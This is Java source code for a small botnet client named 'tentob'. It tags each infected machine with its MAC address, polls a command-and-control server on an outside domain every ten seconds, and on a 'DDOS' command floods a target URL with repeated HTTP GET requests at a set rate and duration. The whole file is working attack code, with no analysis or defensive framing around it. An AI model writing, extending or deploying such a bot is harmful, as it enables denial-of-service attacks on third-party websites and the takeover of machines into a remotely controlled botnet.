package org.tentob;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;

public class Main {

	// properties
	private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36";
	private static final String CC_URL = "http://www.yolocaust.de/tentob/connect.php?id=";

	// commands
	// private static final String IDLE_COMMAND = "IDLE";
	private static final String DDOS_COMMAND = "DDOS";

	// values setted on startup
	private static String BOT_ID;
	private static boolean DEBUG = true;

	// dynamic values
	private static String COMMAND = "IDLE";
	private static String TARGET_URL = "http://www.yolocaust.de/tentob/";
	private static int DDOS_FREQUENCY = 3; // attempts per second
	private static int DDOS_DURATION; // in seconds

	private static void requestCC() throws Exception {

		// set up connection
		String ccUrl = CC_URL + BOT_ID;
		URL ccUrlObj = new URL(ccUrl);
		HttpURLConnection hhHttpURLConnection = (HttpURLConnection) ccUrlObj.openConnection();
		hhHttpURLConnection.setRequestMethod("GET");
		hhHttpURLConnection.setRequestProperty("User-Agent", USER_AGENT);

		// get response
		BufferedReader in = new BufferedReader(new InputStreamReader(hhHttpURLConnection.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();
		while ((inputLine = in.readLine()) != null)
			response.append(inputLine);
		in.close();

		// show response
		if (DEBUG) {
			System.out.println("Requested CC: " + ccUrl);
			System.out.println("Response: " + response.toString());
		}

		// evaluate response
		if (response != null && !response.toString().isEmpty()) {
			String possibleCommand = response.toString().split(" ")[0];
			switch (possibleCommand) {
			case DDOS_COMMAND:
				// expecting 3 more args besides command
				String[] splittedResponse = response.toString().split(" ");
				if (splittedResponse.length == 4) {
					COMMAND = DDOS_COMMAND;
					TARGET_URL = splittedResponse[1];
					DDOS_FREQUENCY = Integer.parseInt(splittedResponse[2]);
					DDOS_DURATION = Integer.parseInt(splittedResponse[3]);
				} else
					System.err.println("x args given, y args expecting => doing nothing");
				break;

			default:
				// nothing
				break;
			}
		}

	}

	private static void performDDoS() throws Exception {

		if(TARGET_URL != null && !TARGET_URL.isEmpty()) {
			for (int i = 0; i < DDOS_FREQUENCY; i++) {
				URL ccUrlObj = new URL(TARGET_URL);
				HttpURLConnection hhHttpURLConnection = (HttpURLConnection) ccUrlObj.openConnection();
				hhHttpURLConnection.setRequestMethod("GET");
				hhHttpURLConnection.setRequestProperty("User-Agent", USER_AGENT);
	
				BufferedReader in = new BufferedReader(new InputStreamReader(hhHttpURLConnection.getInputStream()));
				/*
				 * String inputLine; StringBuffer response = new StringBuffer();
				 * while ((inputLine = in.readLine()) != null)
				 * response.append(inputLine);
				 */
				in.close();
			}
		} else
			System.err.println("No Target-URL specified => no attack performed");

		return;
	}

	public static void main(String[] args) throws Exception {

		try {

			InetAddress inetAddress = InetAddress.getLocalHost();
			NetworkInterface networkInterface = NetworkInterface.getByInetAddress(inetAddress);
			byte[] mac = networkInterface.getHardwareAddress();
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < mac.length; i++) {
				stringBuilder.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
			}
			BOT_ID = stringBuilder.toString();

			if (DEBUG)
				System.out.println("Bot-ID (MAC address): " + BOT_ID);

			// "listen" for a command
			Thread thread = new Thread() {
				public void run() {
					while (true) {
						try {
							Main.requestCC();

							switch (COMMAND) {

							case "DDOS":
								performDDoS();
								break;

							default:
								// just idle around
								break;
							}

							Thread.sleep(10000); // sleep 10 seconds
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
				}
			};
			thread.start();

		} catch (Exception e) {
			e.printStackTrace();
		}

	}

}
